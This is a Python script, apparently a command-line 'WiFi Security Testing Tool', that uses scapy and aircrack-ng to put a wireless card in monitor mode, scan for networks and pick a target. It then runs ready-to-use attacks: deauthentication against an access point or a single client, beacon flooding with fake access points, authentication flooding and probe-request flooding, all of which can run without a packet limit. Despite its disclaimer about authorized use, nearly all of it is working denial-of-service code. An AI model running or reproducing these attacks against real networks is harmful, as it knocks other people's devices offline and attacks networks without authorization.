#!/usr/bin/env python3
"""
WiFi Security Testing Tool
==========================

DISCLAIMER: This tool is for educational purposes and legitimate security testing only.
Only use this tool on networks you own or have explicit permission to test.
Unauthorized use of this tool is illegal and unethical.

Author: Security Testing Tool
Version: 1.0
"""

import os
import sys
import time
import random
import argparse
import threading
import subprocess
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import *

class WiFiSecurityTester:
    def __init__(self):
        self.interface = None
        self.target_bssid = None
        self.target_ssid = None
        self.channel = None
        self.running = False
        self.threads = []
        
    def banner(self):
        """Display tool banner"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    WiFi Security Tester                      ║
║                                                              ║
║  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!      ║
║  Only use on networks you own or have permission to test    ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print("[!] This tool requires root privileges!")
            print("[!] Please run with sudo")
            sys.exit(1)
    
    def check_dependencies(self):
        """Check required dependencies"""
        try:
            import scapy
            print("[+] Scapy found")
        except ImportError:
            print("[!] Scapy not found. Install with: pip install scapy")
            sys.exit(1)
        
        # Check for aircrack-ng suite
        if subprocess.call(['which', 'airmon-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            print("[!] aircrack-ng suite not found. Install with: apt-get install aircrack-ng")
            sys.exit(1)
        else:
            print("[+] aircrack-ng suite found")
    
    def get_interfaces(self):
        """Get available wireless interfaces"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.DEVNULL)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
            return interfaces
        except:
            return []
    
    def set_monitor_mode(self, interface):
        """Set interface to monitor mode"""
        print(f"[*] Setting {interface} to monitor mode...")
        
        # Kill processes that might interfere
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Start monitor mode
        result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True)
        
        # Find the monitor interface name
        for line in result.stdout.split('\n'):
            if 'monitor mode enabled' in line.lower():
                monitor_interface = line.split()[-1].rstrip(')')
                if monitor_interface.startswith('('):
                    monitor_interface = monitor_interface[1:]
                return monitor_interface
        
        # Fallback: try common monitor interface names
        possible_names = [f"{interface}mon", f"{interface}mon0", interface]
        for name in possible_names:
            try:
                # Test if interface exists and is in monitor mode
                subprocess.run(['iwconfig', name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return name
            except:
                continue
        
        return None
    
    def scan_networks(self, interface, duration=10):
        """Scan for available networks"""
        print(f"[*] Scanning for networks on {interface} for {duration} seconds...")
        
        networks = {}
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                
                if bssid not in networks and ssid:
                    networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'signal': pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'Unknown'
                    }
        
        print("[*] Press Ctrl+C to stop scanning...")
        try:
            sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
        except KeyboardInterrupt:
            pass
        
        return networks
    
    def display_networks(self, networks):
        """Display discovered networks"""
        print("\n[+] Discovered Networks:")
        print("-" * 80)
        print(f"{'#':<3} {'BSSID':<18} {'SSID':<32} {'Channel':<8} {'Signal'}")
        print("-" * 80)
        
        for i, (bssid, info) in enumerate(networks.items(), 1):
            print(f"{i:<3} {bssid:<18} {info['ssid']:<32} {info['channel']:<8} {info['signal']}")
        
        return networks
    
    def deauth_attack(self, interface, target_bssid, target_client=None, count=0):
        """Perform deauthentication attack"""
        print(f"[*] Starting deauthentication attack on {target_bssid}")
        if target_client:
            print(f"[*] Targeting specific client: {target_client}")
        else:
            print("[*] Targeting all clients (broadcast)")
        
        # Create deauth packet
        if target_client:
            # Target specific client
            deauth_pkt = RadioTap() / Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
        else:
            # Broadcast deauth
            deauth_pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
        
        sent = 0
        try:
            while self.running and (count == 0 or sent < count):
                sendp(deauth_pkt, iface=interface, verbose=False)
                sent += 1
                if sent % 10 == 0:
                    print(f"[*] Sent {sent} deauth packets")
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        
        print(f"[+] Deauth attack completed. Sent {sent} packets")
    
    def beacon_flood(self, interface, count=100):
        """Perform beacon flooding attack"""
        print(f"[*] Starting beacon flooding attack with {count} fake APs")
        
        sent = 0
        try:
            while self.running and (count == 0 or sent < count):
                # Generate random SSID and BSSID
                fake_ssid = f"FakeAP_{random.randint(1000, 9999)}"
                fake_bssid = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                
                # Create beacon frame
                beacon = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=fake_bssid, addr3=fake_bssid) / \
                        Dot11Beacon(cap="ESS") / \
                        Dot11Elt(ID="SSID", info=fake_ssid) / \
                        Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18\x24') / \
                        Dot11Elt(ID="DSset", info=chr(random.randint(1, 11)))
                
                sendp(beacon, iface=interface, verbose=False)
                sent += 1
                
                if sent % 50 == 0:
                    print(f"[*] Sent {sent} beacon frames")
                
                time.sleep(0.01)
        except KeyboardInterrupt:
            pass
        
        print(f"[+] Beacon flood completed. Sent {sent} fake beacons")
    
    def auth_flood(self, interface, target_bssid, count=1000):
        """Perform authentication flooding attack"""
        print(f"[*] Starting authentication flood on {target_bssid}")
        
        sent = 0
        try:
            while self.running and (count == 0 or sent < count):
                # Generate random client MAC
                client_mac = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                
                # Create authentication request
                auth_req = RadioTap() / Dot11(addr1=target_bssid, addr2=client_mac, addr3=target_bssid) / \
                          Dot11Auth(algo=0, seqnum=1, status=0)
                
                sendp(auth_req, iface=interface, verbose=False)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"[*] Sent {sent} auth requests")
                
                time.sleep(0.001)
        except KeyboardInterrupt:
            pass
        
        print(f"[+] Auth flood completed. Sent {sent} requests")
    
    def probe_flood(self, interface, target_ssid, count=1000):
        """Perform probe request flooding"""
        print(f"[*] Starting probe request flood for SSID: {target_ssid}")
        
        sent = 0
        try:
            while self.running and (count == 0 or sent < count):
                # Generate random client MAC
                client_mac = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                
                # Create probe request
                probe_req = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=client_mac, addr3="ff:ff:ff:ff:ff:ff") / \
                           Dot11ProbeReq() / \
                           Dot11Elt(ID="SSID", info=target_ssid) / \
                           Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18\x24')
                
                sendp(probe_req, iface=interface, verbose=False)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"[*] Sent {sent} probe requests")
                
                time.sleep(0.001)
        except KeyboardInterrupt:
            pass
        
        print(f"[+] Probe flood completed. Sent {sent} requests")
    
    def stop_attack(self):
        """Stop all running attacks"""
        self.running = False
        print("\n[*] Stopping attacks...")
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads.clear()
        print("[+] All attacks stopped")
    
    def cleanup(self):
        """Cleanup and restore interface"""
        if self.interface:
            print(f"[*] Restoring interface {self.interface}...")
            # Stop monitor mode
            original_interface = self.interface.replace('mon', '').replace('0', '')
            subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restart NetworkManager
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    parser = argparse.ArgumentParser(description='WiFi Security Testing Tool')
    parser.add_argument('-i', '--interface', help='Wireless interface to use')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for networks')
    parser.add_argument('-t', '--target', help='Target BSSID')
    parser.add_argument('--ssid', help='Target SSID')
    parser.add_argument('-c', '--client', help='Target client MAC (for deauth)')
    parser.add_argument('--channel', type=int, help='Channel to use')
    parser.add_argument('--count', type=int, default=0, help='Number of packets to send (0 = unlimited)')
    parser.add_argument('--duration', type=int, default=10, help='Scan duration in seconds')
    
    # Attack types
    parser.add_argument('--deauth', action='store_true', help='Deauthentication attack')
    parser.add_argument('--beacon-flood', action='store_true', help='Beacon flooding attack')
    parser.add_argument('--auth-flood', action='store_true', help='Authentication flooding attack')
    parser.add_argument('--probe-flood', action='store_true', help='Probe request flooding attack')
    
    args = parser.parse_args()
    
    tester = WiFiSecurityTester()
    tester.banner()
    tester.check_root()
    tester.check_dependencies()
    
    try:
        # Get available interfaces
        interfaces = tester.get_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces found!")
            sys.exit(1)
        
        # Select interface
        if args.interface:
            if args.interface not in interfaces:
                print(f"[!] Interface {args.interface} not found!")
                sys.exit(1)
            interface = args.interface
        else:
            print("[+] Available wireless interfaces:")
            for i, iface in enumerate(interfaces):
                print(f"  {i+1}. {iface}")
            
            choice = input("[?] Select interface (number): ")
            try:
                interface = interfaces[int(choice) - 1]
            except (ValueError, IndexError):
                print("[!] Invalid selection!")
                sys.exit(1)
        
        # Set monitor mode
        monitor_interface = tester.set_monitor_mode(interface)
        if not monitor_interface:
            print("[!] Failed to set monitor mode!")
            sys.exit(1)
        
        tester.interface = monitor_interface
        print(f"[+] Monitor mode enabled on {monitor_interface}")
        
        # Scan for networks if requested
        if args.scan or not args.target:
            networks = tester.scan_networks(monitor_interface, args.duration)
            if networks:
                displayed_networks = tester.display_networks(networks)
                
                if not args.target:
                    choice = input("\n[?] Select target network (number): ")
                    try:
                        target_bssid = list(displayed_networks.keys())[int(choice) - 1]
                        target_info = displayed_networks[target_bssid]
                        args.target = target_bssid
                        args.ssid = target_info['ssid']
                        args.channel = target_info['channel']
                    except (ValueError, IndexError):
                        print("[!] Invalid selection!")
                        sys.exit(1)
            else:
                print("[!] No networks found!")
                if not args.target:
                    sys.exit(1)
        
        # Set channel if specified
        if args.channel:
            print(f"[*] Setting channel to {args.channel}")
            subprocess.run(['iwconfig', monitor_interface, 'channel', str(args.channel)], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        tester.running = True
        
        # Execute attacks
        if args.deauth:
            if not args.target:
                print("[!] Target BSSID required for deauth attack!")
                sys.exit(1)
            tester.deauth_attack(monitor_interface, args.target, args.client, args.count)
        
        elif args.beacon_flood:
            tester.beacon_flood(monitor_interface, args.count if args.count > 0 else 1000)
        
        elif args.auth_flood:
            if not args.target:
                print("[!] Target BSSID required for auth flood!")
                sys.exit(1)
            tester.auth_flood(monitor_interface, args.target, args.count if args.count > 0 else 1000)
        
        elif args.probe_flood:
            if not args.ssid:
                print("[!] Target SSID required for probe flood!")
                sys.exit(1)
            tester.probe_flood(monitor_interface, args.ssid, args.count if args.count > 0 else 1000)
        
        else:
            print("[!] No attack method specified!")
            print("[*] Use --help for available options")
    
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    
    except Exception as e:
        print(f"[!] Error: {e}")
    
    finally:
        tester.stop_attack()
        tester.cleanup()

if __name__ == "__main__":
    main()